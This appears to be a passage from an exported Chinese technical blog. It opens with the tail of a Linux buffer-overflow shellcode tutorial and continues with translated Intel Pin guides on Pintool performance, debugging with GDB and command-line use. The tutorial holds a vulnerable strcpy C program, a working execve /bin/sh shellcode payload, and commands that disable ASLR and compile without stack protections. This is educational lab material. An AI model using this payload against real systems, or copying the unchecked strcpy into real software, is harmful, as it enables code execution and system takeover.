class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>62<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6e<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>d2<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>0b<span class=\"symbol\">\\x</span>cd<span class=\"symbol\">\\x</span>80\"</div></pre></td></tr></table></figure></p>\n<h1 id=\"3-编写shellcode\"><a href=\"#3-编写shellcode\" class=\"headerlink\" title=\"3 编写shellcode\"></a>3 编写shellcode</h1><p>有漏洞的程序 level.c<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">function</span><span class=\"params\">(<span class=\"keyword\">char</span>* a)</span></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">128</span>];</div><div class=\"line\">    <span class=\"built_in\">strcpy</span>(buf,a);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span>(argc &gt;=<span class=\"number\">2</span> )&#123;</div><div class=\"line\">        function(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,argv[<span class=\"number\">1</span>]);</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>通过调试找到buf起始地址和返回地址，并计算偏移 offset（此过程过程略去不表）<br>则 shellcode 构造如下： exploit + nop*(offset - strlen(exploit)) + exploit起始地址（即buf起始地址）<br>最终的shellcode如下：<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$(python -c 'print \"<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>c0<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>62<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6e<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>d2<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>0b<span class=\"symbol\">\\x</span>cd<span class=\"symbol\">\\x</span>80\"+\"A\"*115+\"<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>ef<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>bf\"')</div></pre></td></tr></table></figure></p>\n<ul>\n<li>关闭地址随机化：echo 0 &gt; /proc/sys/kernel/randomize_va_space</li>\n<li>编译（关掉canary和DEP）：gcc -o level level.c -fno-stack-protector -z execstack</li>\n<li>运行: <figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./level $(python -c 'print \"<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>c0<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>62<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6e<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>d2<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>0b<span class=\"symbol\">\\x</span>cd<span class=\"symbol\">\\x</span>80\"+\"A\"*115+\"<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>ef<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>bf\"')</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f9zz9tuh07j30k8069q4o.jpg\" alt=\"\"></p>\n<h1 id=\"4-参考文献\"><a href=\"#4-参考文献\" class=\"headerlink\" title=\"4 参考文献\"></a>4 参考文献</h1><ul>\n<li><a href=\"http://www.cnblogs.com/Lamboy/archive/2012/07/31/2616103.html\" target=\"_blank\" rel=\"external\">linux下shellcode编写入门</a></li>\n<li><a href=\"http://blog.dutsec.cn/index.php/archives/7/\" target=\"_blank\" rel=\"external\">Linux下本地exploit编写shellcode之一缓冲区溢出|转</a></li>\n<li><a href=\"http://fcinbj.blog.51cto.com/911909/473992\" target=\"_blank\" rel=\"external\">如何编写并编译一个shellcode(linux)</a></li>\n</ul>\n"},{"title":"Intel Pin 8 ：编写 Pintool 时的性能开销","url":"http://huirong.github.io/2016/01/13/Intel-Pin-Performance-Considerations/","content":"<p>Pintool 的编写方式对性能影响很大，本文主要介绍提高性能的几种技术。<br><a id=\"more\"></a><br>从示例开始，下面的代码段源自 source/tools/SimpleExamples/edgcnt.cpp<br>tool 的 instrumentation 组件如下：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">VOID <span class=\"keyword\">Instruction(INS </span><span class=\"keyword\">ins, </span>void *v)</div><div class=\"line\">&#123;</div><div class=\"line\">      ...</div><div class=\"line\"></div><div class=\"line\">      if ( [<span class=\"keyword\">ins </span>is a <span class=\"keyword\">branch </span><span class=\"keyword\">or </span>a call <span class=\"keyword\">instruction] </span>)</div><div class=\"line\">      &#123;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">INS_InsertCall(ins, </span>IPOINT_BEFORE, (AFUNPTR) docount2,</div><div class=\"line\">                       IARG_INST_PTR,</div><div class=\"line\">                       IARG_BRANCH_TARGET_ADDR,</div><div class=\"line\">                       IARG_BRANCH_TAKEN,</div><div class=\"line\">                       IARG_END)<span class=\"comment\">;</span></div><div class=\"line\">      &#125;</div><div class=\"line\"></div><div class=\"line\">      ...</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>analysis 组件：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">VOID docount2( <span class=\"keyword\">ADDRINT </span>src, <span class=\"keyword\">ADDRINT </span>dst, INT32 taken )</div><div class=\"line\">&#123;</div><div class=\"line\">    if(!taken) return<span class=\"comment\">;</span></div><div class=\"line\">    COUNTER *pedg = Lookup( src,dst )<span class=\"comment\">;</span></div><div class=\"line\">    pedg-&gt;_<span class=\"built_in\">count</span>++<span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>此 tool 用于计算控制流转移频率，需统计 calls 和 分支 指令，<font color=\"red\">为了简单起见，本文统称为分支指令</font><br>tool 的工作流程：</p>\n<ul>\n<li>instrumentation 组件为每个分支指令插入 docount2 函数。</li>\n<li>docount2 的 src、dst 、taken参数，为分支指令的源地址和目的地址，taken 表明指令是否执行。</li>\n<li>若没有执行，直接返回；如执行，说明发生控制流转移，通过 src 和 dst 参数查找此控制流边的计数器（如没找到，新建计数器），然后计数器加 1 。</li>\n</ul>\n<h1 id=\"Shifting-Computation-for-Analysis-to-Instrumentation-Code\"><a href=\"#Shifting-Computation-for-Analysis-to-Instrumentation-Code\" class=\"headerlink\" title=\"Shifting Computation for Analysis to Instrumentation Code\"></a>Shifting Computation for Analysis to Instrumentation Code</h1><p>通常应用程序中平均每 5 条指令一条分支指令，接着调用 Lookup 函数，大大降低了应用程序执行速度。</p>\n<p>改善方法：<br>我们注意到，每条指令的 instrumentation 代码只调用一次，而每次执行指令时都会执行对应的 analysis 代码。因此，如果将 analysis 中的部分计算转移到 instrumentation 中，将全面提高性能。</p>\n<p>本例中</p>\n<ul>\n<li>直接分支指令，程序中有大量直接分支指令，因此在 instruction() 中调用 Lookup() </li>\n<li>间接分支指令（即call），相对较少，使用原有 analysis 代码<br>基于此，我们增加了一个轻量级 analysis 函数，docount，而原有的 docount2() 保持不变。<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">docount</span><span class=\"params\">( COUNTER *pedg, INT32 taken )</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span>( !taken ) <span class=\"keyword\">return</span>;</div><div class=\"line\">    pedg-&gt;<span class=\"number\">_</span>count++;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>instrumentation 相对复杂：<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\">VOID Instruction(<span class=\"name\">INS</span> ins, void *v)</div><div class=\"line\">&#123;</div><div class=\"line\">      ...</div><div class=\"line\"></div><div class=\"line\">    if (INS_IsDirectBranchOrCall(ins))</div><div class=\"line\">    &#123;</div><div class=\"line\">        COUNTER *pedg = Lookup( <span class=\"name\">INS_Address</span>(<span class=\"name\">ins</span>),  INS_DirectBranchOrCallTargetAddress(<span class=\"name\">ins</span>) )<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">        INS_InsertCall(<span class=\"name\">ins</span>, IPOINT_BEFORE, (<span class=\"name\">AFUNPTR</span>) docount,</div><div class=\"line\">                       IARG_ADDRINT, pedg,</div><div class=\"line\">                       IARG_BRANCH_TAKEN,</div><div class=\"line\">                       IARG_END)<span class=\"comment\">;</span></div><div class=\"line\">    &#125;</div><div class=\"line\">    else</div><div class=\"line\">    &#123;</div><div class=\"line\">        INS_InsertCall(<span class=\"name\">ins</span>, IPOINT_BEFORE, (<span class=\"name\">AFUNPTR</span>) docount2,</div><div class=\"line\">                       IARG_INST_PTR,</div><div class=\"line\">                       IARG_BRANCH_TARGET_ADDR,</div><div class=\"line\">                       IARG_BRANCH_TAKEN,</div><div class=\"line\">                       IARG_END)<span class=\"comment\">;</span></div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">      ...</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Eliminating-Control-Flow\"><a href=\"#Eliminating-Control-Flow\" class=\"headerlink\" title=\"Eliminating Control Flow\"></a>Eliminating Control Flow</h1><p>docount() 函数为内联函数将有助于提高性能，没有任何控制流转移（单基本块）的例程几乎可以保证为内联函数。<br>如果参数 taken 为 0 或 1 可以使用如下方法消除控制流转移：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">VOID docount( COUNTER *pedg, INT32 taken )</div><div class=\"line\">&#123;</div><div class=\"line\">    pedg-&gt;_<span class=\"built_in\">count</span> += taken<span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n"},{"title":"Intel Pin 7 ：调试 Pintool 注意事项","url":"http://huirong.github.io/2016/01/13/Intel-Pin-Tips-for-Debugging-a-Pintool/","content":"<p>本文是调试 Pintool，并非在 Pintool 下运行的应用程序。<br><a id=\"more\"></a></p>\n<h1 id=\"Using-GDB-on-Linux\"><a href=\"#Using-GDB-on-Linux\" class=\"headerlink\" title=\"Using GDB on Linux\"></a>Using GDB on Linux</h1><p>在 Pin 和 Pintool 下运行应用程序时，Pin 和 应用程序都加载进内存，Pintool 通常是由 Pin 加载的共享对象。本节主要介绍如何使用 GDB 发现 Pintool 中的 bug。</p>\n<p>由于 Pin 使用 debugging API 开启应用程序，所以不能直接在 GDB 中运行 Pin。需在 Pin 命令行中加 -pause_tool 选项，然后在另一个终端中使用 GDB 附加 Pin。-pause_tool 选项的功能，打印 PID 并暂停 n 秒。</p>\n<p>Pin 内置搜索算法查找 tool，因此大多数情况下 GDB 不能加载 tool 的调试信息。GDB 可使用以下几种方法找到调试信息。</p>\n<ul>\n<li>使用完整路径运行 Pin</li>\n<li>Pin 给出确切的 GDB 命令加载调试信息</li>\n</ul>\n<p>如下所示，使用 “info sharedlibrary” 检查 GDB 是否加载了 tool 的调试信息，可以发现 GDB 读取了 tool 的符号。<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) info sharedlibrary</div><div class=\"line\">From        To          Syms Read   Shared Object Library</div><div class=\"line\"><span class=\"number\">0x001b3ea0</span>  <span class=\"number\">0x001b4d80</span>  Yes         /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">libdl</span>.<span class=\"title\">so</span>.2</span></div><div class=\"line\"><span class=\"number\">0x003b3820</span>  <span class=\"number\">0x00431d74</span>  Yes         /usr/intel/pkgs/gcc/<span class=\"number\">4.2</span>.<span class=\"number\">0</span>/<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">libstdc</span>++.<span class=\"title\">so</span>.6</span></div><div class=\"line\"><span class=\"number\">0x0084f4f0</span>  <span class=\"number\">0x00866f8c</span>  Yes         /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i686</span>/<span class=\"title\">libm</span>.<span class=\"title\">so</span>.6</span></div><div class=\"line\"><span class=\"number\">0x00df8760</span>  <span class=\"number\">0x00dffcc4</span>  Yes         /usr/intel/pkgs/gcc/<span class=\"number\">4.2</span>.<span class=\"number\">0</span>/<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">libgcc_s</span>.<span class=\"title\">so</span>.1</span></div><div class=\"line\"><span class=\"number\">0x00e5fa00</span>  <span class=\"number\">0x00f60398</span>  Yes         /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i686</span>/<span class=\"title\">libc</span>.<span class=\"title\">so</span>.6</span></div><div class=\"line\"><span class=\"number\">0x40001c50</span>  <span class=\"number\">0x4001367f</span>  Yes         /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">ld</span>-<span class=\"title\">linux</span>.<span class=\"title\">so</span>.2</span></div><div class=\"line\"><span class=\"number\">0x008977f0</span>  <span class=\"number\">0x00af7784</span>  Yes         ./dcache.so</div></pre></td></tr></table></figure></p>\n<h2 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>例如，如果 tool 为 opcodemix，应用程序是 /bin/ls，GDB的使用步骤如下：<br>此例子运行于 Intel(R) 64 Linux 平台，IA-32 架构使用 “ia32”。</p>\n<ol>\n<li><p>进入 tool 所在的目录，启动 GDB 调试 Pin，但不运行（即，不使用 run 命令）。</p>\n<figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ <span class=\"regexp\">/usr/bin/gdb ../</span>../../intel64/bin/pinbin</div><div class=\"line\">GNU gdb Red Hat Linux (<span class=\"number\">6.3</span>.<span class=\"number\">0.0</span>-<span class=\"number\">1.132</span>.EL4rh)</div><div class=\"line\">Copyright <span class=\"number\">2004</span> Free Software Foundation, Inc.</div><div class=\"line\">GDB <span class=\"keyword\">is</span> free software, covered <span class=\"keyword\">by</span> the GNU General Public License, <span class=\"keyword\">and</span> you are</div><div class=\"line\">welcome <span class=\"keyword\">to</span> change <span class=\"literal\">it</span> <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> distribute copies <span class=\"keyword\">of</span> <span class=\"literal\">it</span> under certain conditions.</div><div class=\"line\">Type <span class=\"string\">\"show copying\"</span> <span class=\"keyword\">to</span> see the conditions.</div><div class=\"line\">There <span class=\"keyword\">is</span> absolutely <span class=\"literal\">no</span> warranty <span class=\"keyword\">for</span> GDB.  Type <span class=\"string\">\"show warranty\"</span> <span class=\"keyword\">for</span> details.</div><div class=\"line\">This GDB was configured as <span class=\"string\">\"x86_64-redhat-linux-gnu\"</span>...Using host libthread_db library <span class=\"string\">\"/lib64/tls/libthread_db.so.1\"</span></div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n</li>\n<li><p>在另一个终端使用 -pause_tool 选项启动应用程序</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ../../../pin -pause_tool 10 -t obj-intel64/opcodemix.so -- /bin/ls</div><div class=\"line\">Pausing to attach to pid 28769</div><div class=\"line\">To load the tool's debug info to gdb use:</div><div class=\"line\">  <span class=\"built_in\"> add-symbol-file </span>.../source/tools/SimpleExamples/obj-intel64/opcodemix.so 0x2a959e9830</div></pre></td></tr></table></figure>\n</li>\n<li><p>然后回到 GDB 附加程序</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) attach <span class=\"number\">28769</span></div><div class=\"line\">Attaching <span class=\"keyword\">to</span> <span class=\"keyword\">program</span>: .../intel64/bin/pinbin, process <span class=\"number\">28769</span></div><div class=\"line\"><span class=\"number\">0</span>x000000314b38f7a2 <span class=\"keyword\">in</span> ?? ()</div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n</li>\n<li><p>在 GDB 中运行第 2 步中提示的命令</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb)<span class=\"built_in\"> add-symbol-file </span>.../source/tools/SimpleExamples/obj-intel64/opcodemix.so 0x2a959e9830<span class=\"built_in\"></span></div><div class=\"line\">add symbol table from file <span class=\"string\">\".../source/tools/SimpleExamples/obj-intel64/opcodemix.so\"</span> at</div><div class=\"line\"><span class=\"keyword\">        .text</span>_addr = 0x2a959e9830</div><div class=\"line\">        (y<span class=\"built_in\"> or </span>n) y</div><div class=\"line\">        Reading symbols from .../source/tools/SimpleExamples/obj-intel64/opcodemix.so...done.</div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n</li>\n<li><p>使用 cont 命令设置断点，也可以先设置断点</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) <span class=\"selector-tag\">b</span> opcodemix<span class=\"selector-class\">.cpp</span>:<span class=\"number\">447</span></div><div class=\"line\">Breakpoint <span class=\"number\">1</span> at <span class=\"number\">0</span>x2a959ecf60: file opcodemix<span class=\"selector-class\">.cpp</span>, line <span class=\"number\">447</span>.</div><div class=\"line\">(gdb) cont</div><div class=\"line\">Continuing.</div><div class=\"line\"></div><div class=\"line\">Breakpoint <span class=\"number\">1</span>, main (argc=<span class=\"number\">7</span>, argv=<span class=\"number\">0</span>x3ff00f12f8) at opcodemix<span class=\"selector-class\">.cpp</span>:<span class=\"number\">447</span></div><div class=\"line\"><span class=\"number\">447</span>     int main(int argc, CHAR *argv[])</div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n</li>\n<li><p>如果程序没有退出，最后需运行 detach 命令释放控制权</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) <span class=\"built_in\">detach</span></div><div class=\"line\">Detaching from program: .../intel64/bin/pinbin, <span class=\"built_in\">process</span> <span class=\"number\">28769</span></div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>重编译程序后，再次使用 GDB 调试时，GDB 会提示二进制文件已修改，需重新读取调试信息。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"Tips for Debugging a Pintool\">Pin 用户手册：Tips for Debugging a Pintool</a></p>\n"},{"title":"Intel Pin 6 ：Pin 应用到应用程序","url":"http://huirong.github.io/2016/01/12/Intel-Pin-Applying-a-Pintool-to-an-Application/","content":"<p>调用应用程序和 tool 的命令如下：<br><a id=\"more\"></a><br><figure class=\"highlight prolog\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pin [pin-option]... -t [toolname] [tool-options]... -- [application] [application-option]..</div></pre></td></tr></table></figure></p>\n<p>以下是几条常见选项，完整列表参见 <a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/group__KNOBS.html\" target=\"_blank\" rel=\"external\"> Command Line Switches</a></p>\n<ul>\n<li>-t toolname，使用的Pintool</li>\n<li>-pause_tool n，打印进程 ID，并暂停 n 秒，允许 GDB 附加调试。详见<a href=\"http://huirong.github.io/2016/01/13/Intel-Pin-Tips-for-Debugging-a-Pintool/\">Tips for Debugging a Pintool</a></li>\n</ul>\n<p>– 之后的都是 应用程序命令行<br>例如，应用 itrace 运行 “ls” 程序。<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">..<span class=\"regexp\">/../</span>..<span class=\"regexp\">/pin -t obj-intel64/i</span>trace.so -- <span class=\"regexp\">/bin/</span>ls</div></pre></td></tr></table></figure></p>\n<p>使用如下命令获取可用的 Pin 命令行选项列表：<br><figure class=\"highlight dos\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pin -<span class=\"built_in\">help</span></div></pre></td></tr></table></figure></p>\n<p>使用如下命令获取 itrace 示例的可用命令行选项列表：<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">..<span class=\"regexp\">/../</span>..<span class=\"regexp\">/pin -t obj-intel64/i</span>trace.so -help -- <span class=\"regexp\">/bin/</span>ls</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">注意：</font>最后的 “/bin/ls” 是必选的，但不会执行。</p>\n<h1 id=\"限制\"><a href=\"#限制\" class=\"headerlink\" title=\"限制\"></a>限制</h1><p>在受 “McAfee Host Intrusion Prevention”（McAfee主机入侵防御）杀毒软件保护的系统上运行 Pin 时，存在一个问题。我们并没有测试其他杀毒软件和 Pin 的兼容性。</p>\n<p>Linux系统会通过  sysctl /proc/sys/kernel/yama/ptrace_scope 禁用 ptrace attach，此时 Pin 不能使用其默认的 injection mode。</p>\n<p>解决方法：</p>\n<ul>\n<li><p>以 root 权限运行如下命令</p>\n <figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$ </span>echo <span class=\"number\">0</span> &gt; <span class=\"regexp\">/proc/sys</span><span class=\"regexp\">/kernel/yama</span><span class=\"regexp\">/ptrace_scope</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>使用 “-injection child” 选项，关于 child injection 的更多信息参见 <a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#INJECTION\" target=\"_blank\" rel=\"external\"> Injection</a></p>\n</li>\n</ul>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#EX\" target=\"_blank\" rel=\"external\">Pin 用户手册：Applying a Pintool to an Application</a></p>\n"},{"title":"Intel Pin 5 ：Pin 高级调试扩展命令","url":"http://huirong.github.io/2016/01/12/Intel-Pin-Advanced-Debugging-Extensions/","content":"<font color=\"blue\">写在前面：Advanced Debugger Extensions，我翻译为 “高级调试扩展命令”，如果大家对此有什么异议，欢迎指正。</font>\n\n<p>Pin的高级调试扩展命令允许程序员调试应用程序，即使程序在Pin下运行。<br><a id=\"more\"></a><br>Pin tool可以在不修改 GDB 或 Visual Studio的情况下，添加对 新调试命令 的支持，这允许程序员通过 live debugger seesion 控制 Pin tool。最后 Pin tools 可通过 instrumentation 增加强大的调试功能。</p>\n<p>如，Pin tools 可使用 instrumentation 查找感兴趣的条件（如，内存缓冲区覆盖），在 live debugger session 中满足此条件时，停止调试。</p>\n<p>Linux（使用 GDB ）和 Windows（使用 Visual Studio ）都支持此功能，并且两个平台的 API 相同，但每个调试器的 UI 不同，使用方法不相同。<br>原教程主要分两部分：</p>\n<ul>\n<li>Linux 平台教程</li>\n<li>Windows平台教程</li>\n</ul>\n<p>两个教程都使用了同一个例子，读者只用阅读其中之一即可，本文只介绍了Linux平台下的使用方法。</p>\n<font color=\"red\">注意：高级调试扩展命令和调试 Pintool 一点关系都没有，如果 Pintool 存在 bug，需要调试，请参见<a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#DEBUGGING\" target=\"_blank\" rel=\"external\">Tips for Debugging a Pintool</a></font> \n\n<h1 id=\"Advanced-Debugging-Extensions-on-Linux\"><a href=\"#Advanced-Debugging-Extensions-on-Linux\" class=\"headerlink\" title=\"Advanced Debugging Extensions on Linux\"></a>Advanced Debugging Extensions on Linux</h1><h2 id=\"1、基本使用方法\"><a href=\"#1、基本使用方法\" class=\"headerlink\" title=\"1、基本使用方法\"></a>1、基本使用方法</h2><p>Linux 下几乎所有 GDB 版本都支持 Pin 调试扩展命令，但是 Pin 需使用 GDB 的 远程调试功能，因此你可以使用任何支持此功能的 GDB 版本。</p>\n<p>本节使用 “source/tools/ManualExamples” 目录下的 “stack-debugger.cpp” 例子说明 Pin 调试扩展命令。</p>\n<p>使用如下命令：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ <span class=\"keyword\">cd</span> source/tools/ManualExamples</div><div class=\"line\">$ make DEBUG=1 <span 